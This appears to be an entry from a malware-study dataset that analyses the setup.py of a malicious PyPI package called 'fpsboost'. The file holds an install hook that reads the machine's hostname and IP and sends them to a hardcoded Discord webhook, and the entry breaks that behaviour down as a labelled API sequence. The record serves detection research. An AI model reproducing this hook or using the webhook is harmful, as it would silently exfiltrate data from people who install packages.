[
  {
    "pyfile": "setup.py",
    "code_snippet": "from setuptools.command.install import install\nimport discord\nimport os\nimport socket\nfrom discord import Webhook\nimport aiohttp\nimport asyncio\n\nclass CustomInstallCommand(install):\n    def run(self):\n        hostname = socket.gethostname()\n        IPAddr = socket.gethostbyname(hostname)\n        async def foo():\n            async with aiohttp.ClientSession() as session:\n                webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', session=session)\n                await webhook.send(f'{hostname} | {IPAddr}\"', username='Foo')\n        asyncio.run(foo())\n        install.run(self)",
    "pattern_analysis": {
      "api_sequence": [
        "socket.gethostname",
        "socket.gethostbyname",
        "aiohttp.ClientSession",
        "discord.Webhook.from_url",
        "discord.Webhook.send",
        "asyncio.run",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "socket.gethostname()",
        "socket.gethostbyname(hostname)",
        "aiohttp.ClientSession()",
        "discord.Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', session=session)",
        "discord.Webhook.send(f'{hostname} | {IPAddr}\"', username='Foo')",
        "asyncio.run(foo())",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "discord.Webhook.from_url",
          "id": "create_discord_webhook",
          "description": "Creates Discord webhook object from URL and session",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Webhook.send",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "asyncio.run",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "from setuptools.command.install import install\nimport socket\nimport aiohttp\nimport asyncio\nfrom discord import Webhook\n\nclass CustomInstallCommand(install):\n    def run(self):\n        hostname = socket.gethostname()\n        IPAddr = socket.gethostbyname(hostname)\n        async def foo():\n            async with aiohttp.ClientSession() as session:\n                webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', session=session)\n                await webhook.send(f'{hostname} | {IPAddr}\"', username='Foo')\n        asyncio.run(foo())\n        install.run(self)"
    }
  },
  {
    "metadata": {
      "package_name": "fpsboost-0.13",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/fpsboost-0.13/fpsboost-0.13/setup.py",
      "code_hash": "0ba4ccabcab630078c1969431e3841d6"
    }
  }
]